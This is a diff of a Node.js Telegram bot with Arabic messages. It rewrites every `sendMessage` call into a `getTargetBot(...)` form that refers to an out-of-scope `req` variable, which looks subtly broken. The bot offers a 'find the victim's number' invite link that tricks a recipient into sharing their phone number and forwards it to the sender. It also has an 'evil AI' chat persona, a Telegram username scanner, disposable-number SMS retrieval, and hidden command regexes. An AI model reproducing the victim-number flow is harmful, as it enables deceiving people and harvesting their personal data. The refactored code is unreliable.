@@ -2889,24 +2952,24 @@ bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
             ]]
         }
     };
-    bot.sendMessage(chatId, "- بوت بحث بـ Pinterest.\n- اضغط على الزر أدناه للبحث عن صور.\n-", options);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "- بوت بحث بـ Pinterest.\n- اضغط على الزر أدناه للبحث عن صور.\n-", options);
 });
 
 
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     if (query.data === 'search_images') {
-        bot.sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (سأجلب لك أفضل النتائج من Unsplash)...");
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (سأجلب لك أفضل النتائج من Unsplash)...");
         userStates[chatId] = { state: 'waiting_for_search' };
     } else if (query.data === 'generate_invite') {
         const inviteLink = `https://t.me/ygf2gbot?start=${chatId}`;
-        bot.sendMessage(chatId, `📲 تم إنشاء رابط "معرفة رقم الضحية" الخاص بك:\n\n${inviteLink}\n\nأرسل هذا الرابط للضحية، وبمجرد دخوله ومشاركته لرقمه، ستصلك معلوماته هنا فوراً! 🔥`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `📲 تم إنشاء رابط "معرفة رقم الضحية" الخاص بك:\n\n${inviteLink}\n\nأرسل هذا الرابط للضحية، وبمجرد دخوله ومشاركته لرقمه، ستصلك معلوماته هنا فوراً! 🔥`);
     } else if (query.data === 'start_private_chat') {
-        bot.sendMessage(chatId, "🧠 أنا الذكاء الاصطناعي الشرير... أرسل لي أي شيء وسأرد عليك بطريقتي الخاصة! 😈");
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "🧠 أنا الذكاء الاصطناعي الشرير... أرسل لي أي شيء وسأرد عليك بطريقتي الخاصة! 😈");
         userStates[chatId] = { state: 'waiting_for_evil_ai' };
     } else if (query.data === 'إرسال_رسالة') {
         const unbanMsg = `مرحباً فريق دعم واتساب،\n\nلقد تم حظر رقمي (+رقمك هنا) عن طريق الخطأ. أنا أستخدم واتساب للتواصل مع عائلتي وأصدقائي ولم أقم بمخالفة شروط الخدمة. يرجى مراجعة حسابي وفك الحظر في أقرب وقت ممكن.\n\nشكراً لكم.`;
-        bot.sendMessage(chatId, `📝 إليك رسالة فك حظر واتساب جاهزة:\n\n\`${unbanMsg}\`\n\nقم بنسخها وإرسالها لبريد دعم واتساب: support@whatsapp.com`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `📝 إليك رسالة فك حظر واتساب جاهزة:\n\n\`${unbanMsg}\`\n\nقم بنسخها وإرسالها لبريد دعم واتساب: support@whatsapp.com`);
     }
 });
 
@@ -2921,7 +2984,7 @@ bot.on('message', async (msg) => {
             const response = await axios.get(url);
             const results = response.data.resource_response?.data?.results || [];
             if (results.length === 0) {
-                bot.sendMessage(chatId, "لا توجد صور بهذا البحث.");
+                getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لا توجد صور بهذا البحث.");
 
                 delete currentSearch[chatId];
                 return;
@@ -2933,14 +2996,14 @@ bot.on('message', async (msg) => {
                 if (photoUrl) {
                     bot.sendPhoto(chatId, photoUrl, { caption: `الصوره ${index + 1}` });
                 } else {
-                    bot.sendMessage(chatId, "لم أتمكن من العثور على رابط الصورة.");
+                    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لم أتمكن من العثور على رابط الصورة.");
                 }
             }
 
             delete currentSearch[chatId];
 
         } catch (e) {
-            bot.sendMessage(chatId, `حدث خطأ: ${e.message}`);
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `حدث خطأ: ${e.message}`);
 
             delete currentSearch[chatId];
         }
@@ -3141,7 +3204,7 @@ bot.onText(/\/staㅎrtradㅎㅗio/, (msg) => {
             ]
         }
     };
-    bot.sendMessage(chatId, "مرحباً! اضغط على الزر أدناه لاختيار دولة والحصول على محطات الراديو.", options);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "مرحباً! اضغط على الزر أدناه لاختيار دولة والحصول على محطات الراديو.", options);
 });
 
 
@@ -3264,7 +3327,7 @@ bot.onText(/\/stظصakعصمrt/, (msg) => {
             ]
         }
     };
-    bot.sendMessage(chatId, 'أهلاً بك! اضغط على الزر لتزخرف اسمك.', options);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'أهلاً بك! اضغط على الزر لتزخرف اسمك.', options);
 });
 
 
@@ -3388,7 +3451,7 @@ bot.on('callback_query', (callbackQuery) => {
                 ]
             }
         };
-        bot.sendMessage(chatId, 'اختر نوع الصوت:', options);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, 'اختر نوع الصوت:', options);
     } else if (callbackQuery.data === 'male_voice' || callbackQuery.data === 'female_voice') {
         const gender = callbackQuery.data === 'male_voice' ? 'male' : 'female';
 
@@ -3398,7 +3461,7 @@ bot.on('callback_query', (callbackQuery) => {
 
         bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: callbackQuery.message.message_id });
 
-        bot.sendMessage(chatId, `الآن أرسل النص الذي تريد تحويله إلى صوت بصوت ${gender === 'male' ? 'ذكر' : 'أنثى'}.`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `الآن أرسل النص الذي تريد تحويله إلى صوت بصوت ${gender === 'male' ? 'ذكر' : 'أنثى'}.`);
     }
 });
 
@@ -3507,7 +3570,7 @@ async function startSearch(chatId, messageId, userType) {
 
       if (url.data.includes('tgme_username_link')) {
         validUsers++;
-        bot.sendMessage(chatId, `تم الصيد بوزر جديد ✅ : @${user}`);
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, `تم الصيد بوزر جديد ✅ : @${user}`);
         userList.push(user);
       } else {
 
@@ -3551,7 +3614,7 @@ function showFinalStatistics(chatId) {
     }
   };
 
-  bot.sendMessage(chatId, "تم الانتهاء من البحث. هذه هي الإحصائيات النهائية:", options);
+  getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "تم الانتهاء من البحث. هذه هي الإحصائيات النهائية:", options);
 }
 
 
@@ -3564,7 +3627,7 @@ bot.onText(/\/stㄹㅎㅊart/, (msg) => {
       ]
     }
   };
-  bot.sendMessage(chatId, "أهلاً بك! اضغط على الزر لبدء صيد اليوزرات.", options);
+  getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "أهلاً بك! اضغط على الزر لبدء صيد اليوزرات.", options);
 });
 
 
@@ -3698,7 +3761,7 @@ async function استخراج_الرسائل_من_الموقع(رقم) {
 
 bot.onText(/\/starㅇ함ㅏㅏㅗht/, async (message) => {
     const chatId = message.chat.id;
-    bot.sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", {
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", {
         reply_markup: {
             inline_keyboard: [[{ text: 'الحصول على رقم وهمي', callback_data: 'الحصول_على_رقم' }]]
         }
@@ -3716,9 +3779,9 @@ bot.on('callback_query', async (callbackQuery) => {
         const رقم = callbackQuery.data.split('_')[2];
         const الرسائل = await استخراج_الرسائل_من_الموقع(رقم);
         if (الرسائل) {
-            bot.sendMessage(chatId, تنسيق_الرسائل(الرسائل), { parse_mode: 'Markdown' });
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, تنسيق_الرسائل(الرسائل), { parse_mode: 'Markdown' });
         } else {
-            bot.sendMessage(chatId, "لا توجد رسائل جديدة.");
+            getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "لا توجد رسائل جديدة.");
         }
     } else if (callbackQuery.data === 'تغيير_الرقم') {
         const معلومات = await الحصول_على_معلومات_رقم_عشوائي();
@@ -3746,7 +3809,7 @@ async function ارسال_معلومات_الرقم(message, معلومات) {
             ]
         }
     };
-    await bot.sendMessage(chatId, response, { parse_mode: 'Markdown', reply_markup: markup.reply_markup });
+    await getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, response, { parse_mode: 'Markdown', reply_markup: markup.reply_markup });
 }
 
 
@@ -3987,7 +4050,7 @@ function showDreamMenu(chatId) {
         }
     };
 
-    bot.sendMessage(chatId, "مرحبًا! اضغط على الزر أدناه لاختيار نوع التفسير:", options);
+    getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "مرحبًا! اضغط على الزر أدناه لاختيار نوع التفسير:", options);
 }
 
 bot.on('callback_query', (query) => {
@@ -4014,10 +4077,10 @@ bot.on('callback_query', (query) => {
             reply_markup: options.reply_markup
         });
     } else if (query.data === "ar") {
-        bot.sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة الذكاء الاصطناعي:");
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة الذكاء الاصطناعي:");
         userSessionsg[chatId].state = "ar";
     } else if (query.data === "ibn_sirin") {
-        bot.sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة تفسير ابن سيرين:");
+        getTargetBot(typeof req !== 'undefined' ? (req.body.bot || req.query.bot) : null).sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة تفسير ابن سيرين:");
         userSessionsg[chatId].state = "ibn_sirin";
     }
 });
